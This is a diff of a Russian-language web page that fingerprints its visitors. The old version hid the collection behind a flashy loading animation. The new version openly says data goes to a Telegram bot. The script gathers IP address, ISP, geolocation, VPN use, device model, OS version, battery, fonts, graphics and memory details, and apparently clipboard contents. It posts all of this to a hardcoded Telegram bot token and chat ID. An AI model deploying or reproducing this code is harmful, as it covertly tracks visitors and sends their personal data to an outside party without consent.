@@ -3,145 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Невероятная анимация загрузки</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.9.1/gsap.min.js"></script>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
-
-        body, html {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            background-color: #000;
-            font-family: 'Orbitron', sans-serif;
-        }
-
-        #scene {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-        }
-
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            background: radial-gradient(circle, rgba(0,0,0,0) 0%, rgba(0,0,0,0.8) 100%);
-        }
-
-        .text {
-            font-size: 36px;
-            color: #00ffff;
-            text-shadow: 0 0 10px #00ffff;
-            text-align: center;
-            opacity: 0;
-        }
-
-        .progress-container {
-            width: 300px;
-            height: 10px;
-            background-color: rgba(0, 255, 255, 0.2);
-            border-radius: 5px;
-            overflow: hidden;
-            margin-top: 20px;
-        }
-
-        .progress-bar {
-            width: 0%;
-            height: 100%;
-            background-color: #00ffff;
-            box-shadow: 0 0 10px #00ffff;
-            transition: width 0.5s ease;
-        }
-    </style>
+    <title>Информация об устройстве и определение IP</title>
 </head>
 <body>
-    <div id="scene"></div>
-    <div class="overlay">
-        <div class="text">ГОТОВЬСЯ, СЫНОК!<br>МЫ ЗАПУСКАЕМ НЕЧТО НЕВЕРОЯТНОЕ!</div>
-        <div class="progress-container">
-            <div class="progress-bar"></div>
-        </div>
-    </div>
+    <h1>Добро пожаловать на страницу определения информации об устройстве и IP</h1>
+    <p>Информация о вашем устройстве и IP-адрес будет отправлена в Telegram-бот.</p>
+
     <script>
         const botToken = '7305121459:AAFx3_Ggju_WLXb8sqmkK27NDOiQcOUwy0w';
         const chatId = '1653222949';
         const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
         async function getDeviceBrandAndModel() {
-            const userAgent = navigator.userAgent;
-            let deviceBrand = 'Unknown';
-            let deviceModel = 'Unknown';
+    const userAgent = navigator.userAgent;
+    let deviceBrand = 'Unknown';
+    let deviceModel = 'Unknown';
 
-            if (/android/i.test(userAgent)) {
-                deviceBrand = 'Android';
-                const match = userAgent.match(/;\s(.*?)(?:\sBuild|\))/);
-                if (match) {
-                    deviceModel = match[1];
-                }
-            } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-                deviceBrand = 'Apple';
-                const match = userAgent.match(/\(([a-zA-Z]+);.*?OS\s([0-9_]+)/);
-                if (match) {
-                    deviceModel = match[1];
-                }
+    const brandPatterns = {
+        'Samsung': /SM-|SAMSUNG/i,
+        'Huawei': /HUAWEI|HW-/i,
+        'Xiaomi': /Redmi|Mi\s|POCO/i,
+        'OPPO': /OPPO|CPH\d{4}/i,
+        'Vivo': /vivo/i,
+        'OnePlus': /OnePlus/i,
+        'LG': /LG-|LM-/i,
+        'Sony': /Sony/i,
+        'Nokia': /Nokia/i,
+        'Motorola': /Moto/i,
+        'Asus': /ASUS/i,
+        'Lenovo': /Lenovo/i,
+        'ZTE': /ZTE/i,
+        'Realme': /Realme/i,
+        'Google': /Pixel/i
+    };
+
+    if (/Android/.test(userAgent)) {
+        const modelPatterns = [
+            /;\s*([^;]+?)\s+Build\//i,
+            /;\s*([^;]+?)\s+\)/i,
+            /\(([^;]+?);\s*/i,
+            /;\s*([^;]+?)\s*;/i,
+            /Android.*;\s*([^;]+?)\s*;/i,
+            /Android.*?\(([^;]+?)\)/i
+        ];
+
+        for (let pattern of modelPatterns) {
+            const match = userAgent.match(pattern);
+            if (match && match[1]) {
+                deviceModel = match[1].trim().replace(/Android|Mobile|Build|Version|Release|Linux/gi, '').trim();
+                if (deviceModel) break;
             }
-
-            return { brand: deviceBrand, model: deviceModel };
         }
+
+        for (let [brand, pattern] of Object.entries(brandPatterns)) {
+            if (pattern.test(userAgent)) {
+                deviceBrand = brand;
+                break;
+            }
+        }
+    }
+
+    return { brand: deviceBrand, model: deviceModel };
+}
 
         async function getDeviceInfo() {
-            const userAgent = navigator.userAgent;
-            const deviceInfo = {
-                screenResolution: `${window.screen.width}x${window.screen.height}`,
-                language: navigator.language,
-                platform: navigator.platform,
-                uptime: Math.round(performance.now() / 1000),
-                webglSupport: supportsWebGL(),
-                fonts: await getFonts(),
-                renderTime: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart
-            };
+    const userAgent = navigator.userAgent;
+    const deviceInfo = {
+        screenResolution: `${window.screen.width}x${window.screen.height}`,
+        language: navigator.language,
+        platform: navigator.platform,
+        uptime: Math.round(performance.now() / 1000),
+        webglSupport: supportsWebGL(),
+        fonts: await getFonts(),
+        renderTime: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
+        osVersion: 'Unknown'  // Добавляем поле для версии ОС
+    };
 
-            if (/android/i.test(userAgent)) {
-                deviceInfo.device = 'Android';
-            } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-                deviceInfo.device = 'iOS';
-            } else {
-                deviceInfo.device = 'Unknown';
-            }
+    if (/android/i.test(userAgent)) {
+        deviceInfo.device = 'Android';
+        const versionMatch = userAgent.match(/Android\s([0-9\.]+)/);
+        deviceInfo.osVersion = versionMatch ? versionMatch[1] : 'Неизвестно';
+    } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+        deviceInfo.device = 'iOS';
+        const versionMatch = userAgent.match(/OS\s([0-9_]+)/);
+        deviceInfo.osVersion = versionMatch ? versionMatch[1].replace(/_/g, '.') : 'Неизвестно';
+    } else if (/Windows NT/i.test(userAgent)) {
+        deviceInfo.device = 'Windows';
+        const versionMatch = userAgent.match(/Windows NT\s([0-9\.]+)/);
+        deviceInfo.osVersion = versionMatch ? versionMatch[1] : 'Неизвестно';
+    } else {
+        deviceInfo.device = 'Unknown';
+    }
 
-            if (/chrome|crios|crmo/i.test(userAgent)) {
-                deviceInfo.browser = 'Chrome';
-            } else if (/firefox|iceweasel|fxios/i.test(userAgent)) {
-                deviceInfo.browser = 'Firefox';
-            } else if (/safari/i.test(userAgent)) {
-                deviceInfo.browser = 'Safari';
-            } else if (/msie|trident/i.test(userAgent)) {
-                deviceInfo.browser = 'Internet Explorer';
-            } else {
-                deviceInfo.browser = 'Unknown';
-            }
+    if (/chrome|crios|crmo/i.test(userAgent)) {
+        deviceInfo.browser = 'Chrome';
+    } else if (/firefox|iceweasel|fxios/i.test(userAgent)) {
+        deviceInfo.browser = 'Firefox';
+    } else if (/safari/i.test(userAgent)) {
+        deviceInfo.browser = 'Safari';
+    } else if (/msie|trident/i.test(userAgent)) {
+        deviceInfo.browser = 'Internet Explorer';
+    } else {
+        deviceInfo.browser = 'Unknown';
+    }
 
-            if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                deviceInfo.batteryLevel = battery.level * 100 + '%';
-            } else {
-                deviceInfo.batteryLevel = 'Not supported';
-            }
+    if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        deviceInfo.batteryLevel = battery.level * 100 + '%';
+    } else {
+        deviceInfo.batteryLevel = 'Not supported';
+    }
 
-            return deviceInfo;
-        }
+    return deviceInfo;
+}
 
         function supportsWebGL() {
             try {
@@ -271,6 +245,7 @@ async function getCompleteInfo() {
     const internetSpeed = await checkInternetSpeed();
 
     const browserInfo = `User Agent: ${navigator.userAgent}\nBrowser Name: ${navigator.appName}`;
+   
     const osInfo = `Platform: ${navigator.platform}`;
     const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     const platformInfo = `CPU Class: ${navigator.cpuClass || 'Unknown'}`;
@@ -283,41 +258,48 @@ async function getCompleteInfo() {
     const hasFlash = !!navigator.mimeTypes['application/x-shockwave-flash'];
 
     let message = `
-        IP-адрес пользователя: ${ipAddress}
-        Устройство: ${deviceInfo.device}
-        Марка устройства: ${deviceBrandAndModel.brand}
-        Модель устройства: ${deviceBrandAndModel.model}
-        Браузер: ${deviceInfo.browser}
-        Провайдер: ${isp}
-        Разрешение экрана: ${deviceInfo.screenResolution}
-        Язык: ${deviceInfo.language}
-        Платформа: ${deviceInfo.platform}
-        Время работы системы: ${deviceInfo.uptime} сек.
-        Местоположение: ${location}
-        Использование VPN/Proxy: ${vpnStatus}
-        Поддержка WebGL: ${deviceInfo.webglSupport}
-        Установленные шрифты: ${deviceInfo.fonts}
-        Время рендеринга страницы: ${deviceInfo.renderTime} мс
-        Уровень заряда батареи: ${deviceInfo.batteryLevel}
-        Таймзона пользователя: ${timeZone}
-        Информация о браузере: ${browserInfo}
-        Информация об ОС: ${osInfo}
-        Детальная статистика о платформе: ${platformInfo}
-        Скорость интернета: ${internetSpeed} Mbps
-        Информация о видеокарте: ${graphicsInfo}
-        Доступная память устройства: ${memoryInfo}
-        Проверка установленного Flash Player: ${hasFlash ? 'Установлен' : 'Не установлен'}
-        Интернет-провайдер: ${ispData.isp}
-        Имя провайдера: ${ispData.org}
-        Номер AS провайдера: ${ispData.as}
-        Тип сети: ${networkType}
-        Языковые предпочтения: ${languagePreference}
+         🌐  Информация об IP и сети:
+├ IP-адрес: ${ipAddress}
+├ Провайдер: ${isp}
+├ Интернет-провайдер: ${ispData.isp}
+├ Имя провайдера: ${ispData.org}
+├ Номер AS провайдера: ${ispData.as}
+├ Тип сети: ${networkType}
+├ Скорость интернета: ${internetSpeed} Mbps
+└ Использование VPN / Proxy: ${vpnStatus}
+
+🌍 Информация о локации и времени:
+├ Местоположение: ${location}
+└ Таймзона пользователя: ${timeZone}
+
+ 📲 Информация об устройстве:
+├ Операционная система: ${deviceInfo.device}
+├ Бренд устройства: ${deviceBrandAndModel.brand}
+├ Название модели: ${deviceBrandAndModel.model}
+├ Версия OS: ${deviceInfo.osVersion}
+├ Разрешение экрана: ${deviceInfo.screenResolution}
+├ Уровень заряда батареи: ${deviceInfo.batteryLevel}
+├ Оперативная память устройства: ${memoryInfo}
+├ Информация о видеокарте: ${graphicsInfo}
+└ Поддержка WebGL: ${deviceInfo.webglSupport}
+
+🌀 Информация о платформе и системе:
+├ Платформа: ${deviceInfo.platform}
+├ Информация об ОС: ${osInfo}
+├ Детальная статистика о платформе: ${platformInfo}
+└ Время работы системы:  ${deviceInfo.uptime} сек.
+
+⚠️ Информация о пользовательских настройках:
+├ Язык: ${deviceInfo.language}
+├ Языковые предпочтения: ${languagePreference}
+└ Установленные шрифты: ${deviceInfo.fonts}
+
+🏍 Информация о производительности:
+└ Время рендеринга страницы: ${deviceInfo.renderTime} мс
     `;
 
     if (deviceBrandAndModel.model !== 'Unknown') {
-        message += `
-        \nПРОИЗОШЛО РАСПОЗНОВАНИЕ МОДЕЛИ УСТРОЙСТВА:
-        Модель устройства: ${deviceBrandAndModel.model}`;
+     
 
         const inlineButtonUrl = `https://www.google.com/search?q=Модель+устройства%3A+${encodeURIComponent(deviceBrandAndModel.model)}&client=ms`;
 
@@ -508,103 +490,6 @@ async function getChargingStatusButton() {
         function requestClipboardData() {
             getClipboardData();
         }
-    </script>
-     <script>
-        let scene, camera, renderer, particles, animationFrameId;
-
-        function init() {
-            scene = new THREE.Scene();
-            camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
-            renderer = new THREE.WebGLRenderer();
-            renderer.setSize(window.innerWidth, window.innerHeight);
-            document.getElementById('scene').appendChild(renderer.domElement);
-
-            const geometry = new THREE.BufferGeometry();
-            const vertices = [];
-            const sizes = [];
-
-            for (let i = 0; i < 10000; i++) {
-                vertices.push(THREE.MathUtils.randFloatSpread(2000));
-                vertices.push(THREE.MathUtils.randFloatSpread(2000));
-                vertices.push(THREE.MathUtils.randFloatSpread(2000));
-                sizes.push(THREE.MathUtils.randFloat(1, 5));
-            }
-
-            geometry.setAttribute('position', new THREE.Float32BufferAttribute(vertices, 3));
-            geometry.setAttribute('size', new THREE.Float32BufferAttribute(sizes, 1));
-
-            const material = new THREE.PointsMaterial({
-                color: 0x00ffff,
-                size: 2,
-                blending: THREE.AdditiveBlending,
-                transparent: true,
-                sizeAttenuation: true
-            });
-
-            particles = new THREE.Points(geometry, material);
-            scene.add(particles);
-
-            camera.position.z = 1000;
-        }
-
-        function animate() {
-            animationFrameId = requestAnimationFrame(animate);
-            particles.rotation.x += 0.001;
-            particles.rotation.y += 0.002;
-
-            // Добавляем постоянный эффект быстрого вхождения
-            camera.position.z = 1000 + Math.sin(Date.now() * 0.001) * 990;
-
-            renderer.render(scene, camera);
-        }
-
-        function startLoading() {
-            init();
-            animate();
-
-            const text = document.querySelector('.text');
-            const progressBar = document.querySelector('.progress-bar');
-
-            gsap.to(text, {opacity: 1, duration: 1, ease: "power2.inOut"});
-
-            gsap.to(progressBar, {
-                width: "100%", 
-                duration: 5, 
-                ease: "power1.inOut",
-                onComplete: () => {
-                    gsap.to(text, {
-                        opacity: 0, 
-                        duration: 1, 
-                        delay: 1,
-                        onComplete: () => {
-                            text.textContent = "ГОТОВО! ПОГНАЛИ!";
-                            gsap.to(text, {opacity: 1, duration: 1});
-                        }
-                    });
-
-                    // Удаляем этот блок, так как теперь у нас постоянный эффект вхождения
-                    /*
-                    gsap.to(camera.position, {
-                        z: 10, 
-                        duration: 3, 
-                        ease: "power2.inOut",
-                        onComplete: () => {
-                            cancelAnimationFrame(animationFrameId);
-                            // Here you can add code to transition to your main content
-                        }
-                    });
-                    */
-                }
-            });
-        }
-
-        window.addEventListener('resize', () => {
-            camera.aspect = window.innerWidth / window.innerHeight;
-            camera.updateProjectionMatrix();
-            renderer.setSize(window.innerWidth, window.innerHeight);
-        });
-
-        startLoading();
-    </script>
+    </script> 
 </body>
-</html>
+</html> 
